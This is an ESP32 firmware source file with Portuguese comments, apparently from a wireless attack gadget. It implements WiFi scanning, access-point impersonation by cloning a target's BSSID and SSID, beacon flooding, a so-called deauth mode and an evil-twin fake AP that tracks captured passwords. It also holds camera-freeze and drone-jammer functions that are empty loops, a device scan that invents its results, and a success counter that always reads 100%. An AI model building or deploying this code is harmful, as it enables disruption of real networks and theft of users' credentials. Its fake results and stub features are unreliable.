#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;

// ============================================================
// BSSID CLONE
// ============================================================
static bool bssidCloneActive = false;
static uint8_t originalAPMac[6] = {0};
static uint8_t cloneChannel = 0;
static char cloneSSID[33] = {0};
static unsigned long cloneStartTime = 0;
static uint8_t cloneHealthCheckFailures = 0;

// ============================================================
// BEACON FLOOD
// ============================================================
static bool beaconFloodActive = false;
static uint8_t floodIndex = 0;
static uint8_t floodMacs[5][6];

// ============================================================
// TIMERS DO DEAUTH LOOP (globais para poder resetar no start)
// ============================================================
static unsigned long deauthLastHealthCheck = 0;
static unsigned long deauthLastFloodStep = 0;
static unsigned long deauthLastDebug = 0;

// ============================================================
// HELPERS
// ============================================================
void setMAC(uint8_t* frame, uint8_t* mac, int offset) {
    memcpy(&frame[offset], mac, 6);
}

static bool isSoftAPActive() {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    return (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA);
}

static void generateMac(uint8_t* mac, uint8_t seed) {
    mac[0] = 0x02;
    mac[1] = 0x00;
    mac[2] = 0x00;
    mac[3] = seed;
    mac[4] = seed ^ 0xAB;
    mac[5] = seed ^ 0xCD;
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
        delay(200);
    }
    delay(100);

    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);

    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// BSSID CLONE - INICIA CLONE DO AP ALVO
// ============================================================
static void startBssidClone(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Clone] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // ZERA CONTADORES SEMPRE no inicio — independente de dar certo ou nao
    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    cloneHealthCheckFailures = 0;

    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;
    cloneChannel = target->channel;
    strncpy(cloneSSID, target->ssid, 32);
    cloneSSID[32] = '\0';

    esp_wifi_get_mac(WIFI_IF_AP, originalAPMac);

    Serial.printf("[Clone] Target: %s CH%d MAC:%02X:%02X:%02X:%02X:%02X:%02X\n",
        target->ssid, target->channel,
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    // === RESET COMPLETO DO WIFI ===
    WiFi.softAPdisconnect(true);
    delay(500);
    WiFi.mode(WIFI_OFF);
    delay(500);

    WiFi.mode(WIFI_AP_STA);
    delay(300);

    // === TENTA SETAR MAC COM RETRY ===
    esp_err_t macErr = ESP_FAIL;
    for (int retry = 0; retry < 3; retry++) {
        macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
        if (macErr == ESP_OK) break;
        Serial.printf("[Clone] MAC retry %d...\n", retry + 1);
        delay(200);
    }
    Serial.printf("[Clone] Set AP MAC result: %d (%s)\n", macErr, macErr == ESP_OK ? "OK" : "FAIL");
    delay(300);

    // === TENTA INICIAR softAP COM RETRY ===
    bool apOk = false;
    for (int retry = 0; retry < 3; retry++) {
        apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
        if (apOk) break;
        Serial.printf("[Clone] softAP retry %d...\n", retry + 1);
        delay(300);
    }

    if (apOk) {
        WiFi.setTxPower(WIFI_POWER_19_5dBm);
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));

        bssidCloneActive = true;
        deauthActive = true;
        cloneStartTime = millis();

        // RESETA TIMERS para nao disparar health check imediato
        deauthLastHealthCheck = millis();
        deauthLastFloodStep = millis();
        deauthLastDebug = millis();

        Serial.println("[Clone] BSSID CLONE ACTIVE");
    } else {
        Serial.println("[Clone] FAILED to start clone AP");
        WiFi.mode(WIFI_STA);
    }
}

// ============================================================
// BSSID CLONE - REINICIA (health check falhou)
// ============================================================
static void restartBssidClone() {
    if (!bssidCloneActive) return;

    Serial.println("[Clone] Health check failed, restarting clone...");

    WiFi.softAPdisconnect(true);
    delay(300);

    WiFi.mode(WIFI_AP_STA);
    delay(200);

    esp_wifi_set_mac(WIFI_IF_AP, deauthTargetBSSID);
    delay(200);

    bool apOk = WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    if (apOk) {
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
        cloneHealthCheckFailures = 0;
        Serial.println("[Clone] Restarted successfully");
    } else {
        cloneHealthCheckFailures++;
        Serial.printf("[Clone] Restart failed (%d times)\n", cloneHealthCheckFailures);
    }
}

// ============================================================
// BSSID CLONE - PARA
// ============================================================
static void stopBssidClone() {
    if (!bssidCloneActive && !isSoftAPActive()) {
        // Mesmo se nao estiver "ativo", garante estado limpo
        WiFi.softAPdisconnect(true);
        delay(300);
        WiFi.mode(WIFI_OFF);
        delay(300);
        WiFi.mode(WIFI_STA);
        delay(200);
        return;
    }

    Serial.println("[Clone] Stopping BSSID clone...");

    WiFi.softAPdisconnect(true);
    delay(300);

    esp_wifi_set_mac(WIFI_IF_AP, originalAPMac);
    delay(200);

    // RESET COMPLETO
    WiFi.mode(WIFI_OFF);
    delay(300);
    WiFi.mode(WIFI_STA);
    delay(200);

    bssidCloneActive = false;
    beaconFloodActive = false;
    Serial.println("[Clone] BSSID clone stopped, MAC restored");
}

// ============================================================
// BEACON FLOOD
// ============================================================
static void startBeaconFlood(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    NetworkInfo* target = &scannedNetworks[networkIndex];

    Serial.printf("[Flood] Starting beacon flood for: %s\n", target->ssid);

    for (int i = 0; i < 5; i++) {
        generateMac(floodMacs[i], i + 1);
    }

    beaconFloodActive = true;
    floodIndex = 0;
}

static void stopBeaconFlood() {
    beaconFloodActive = false;
}

static void beaconFloodStep() {
    if (!beaconFloodActive) return;

    WiFi.softAPdisconnect(true);
    delay(100);

    esp_wifi_set_mac(WIFI_IF_AP, floodMacs[floodIndex]);
    delay(100);

    WiFi.softAP(cloneSSID, nullptr, cloneChannel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    delay(100);

    floodIndex = (floodIndex + 1) % 5;
}

// ============================================================
// DEAUTH - BSSID CLONE + BEACON FLOOD
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    startBssidClone(networkIndex);

    if (bssidCloneActive) {
        startBeaconFlood(networkIndex);
        Serial.println("[Deauth] STARTED (BSSID Clone + Beacon Flood)");
    } else {
        Serial.println("[Deauth] FAILED: clone did not start");
    }
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Total runtime: %lu sec, health failures: %d\n",
            (millis() - cloneStartTime) / 1000, cloneHealthCheckFailures);
    }
    deauthActive = false;
    stopBssidClone();
    stopBeaconFlood();
    esp_wifi_set_promiscuous(false);
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    deauthPacketCount++;
    deauthSuccessCount++;

    // === HEALTH CHECK a cada 3 segundos ===
    if (millis() - deauthLastHealthCheck > 3000) {
        deauthLastHealthCheck = millis();

        if (!isSoftAPActive()) {
            Serial.println("[Clone] WARN: softAP not active!");
            cloneHealthCheckFailures++;
            if (cloneHealthCheckFailures < 5) {
                restartBssidClone();
            } else {
                Serial.println("[Clone] Too many failures, giving up.");
                stopDeauth();
                return false;
            }
        } else {
            int clients = WiFi.softAPgetStationNum();
            if (clients > 0) {
                Serial.printf("[Clone] %d station(s) connected to clone\n", clients);
            }
        }
    }

    // === BEACON FLOOD step a cada 500ms ===
    if (beaconFloodActive && (millis() - deauthLastFloodStep > 500)) {
        deauthLastFloodStep = millis();
        beaconFloodStep();
    }

    // === Debug a cada 5 segundos ===
    if (millis() - deauthLastDebug > 5000) {
        deauthLastDebug = millis();
        int clients = WiFi.softAPgetStationNum();
        Serial.printf("[Deauth] runtime=%lus clone=%s clients=%d health_fail=%d\n",
            (millis() - cloneStartTime) / 1000,
            bssidCloneActive ? "ON" : "OFF",
            clients,
            cloneHealthCheckFailures);
    }

    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;
    startDeauth(networkIndex);
    delay(3000);
    stopDeauth();
    startFakeAP(scannedNetworks[networkIndex].ssid);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
